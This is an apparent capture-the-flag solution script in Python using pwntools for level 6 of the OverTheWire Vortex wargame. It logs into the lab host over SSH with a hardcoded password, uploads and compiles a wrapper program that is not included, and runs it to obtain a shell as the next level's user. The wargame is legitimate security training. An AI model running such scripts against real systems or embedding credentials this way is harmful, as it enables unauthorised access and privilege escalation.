#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 6
USER = 'vortex%s' % level
HOST = 'vortex.labs.overthewire.org'
PASS = '*uy5qDRb2'
PORT = 2228

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def setup_payload(sh):
    shell = sh.run('/bin/bash')
    w = log.progress("Creating /tmp/tald6")
    shell.sendline(b'mkdir /tmp/tald6')
    shell.sendline(b'cd /tmp/tald6')
    sh.set_working_directory(b'/tmp/tald6')
    w.success("Created")
    time.sleep(0.05)
    sh.upload_file("./serverwrapper.c")
    time.sleep(0.05)
    w = log.progress("Compiling vortex 6 wrapper...")
    shell.sendline("gcc -m32 /tmp/tald6/serverwrapper.c -o /tmp/tald6/pwn")
    w.success("compiled")

def execute_payload(sh):
    time.sleep(0.05)
    w = log.progress("Executing vortex 6 wrapper...")
    shell = sh.run(b'/tmp/tald6/pwn ')
    w.success("vortex7 shell established")
    shell.interactive()

sh = connect_to_level()
setup_payload(sh)
execute_payload(sh)
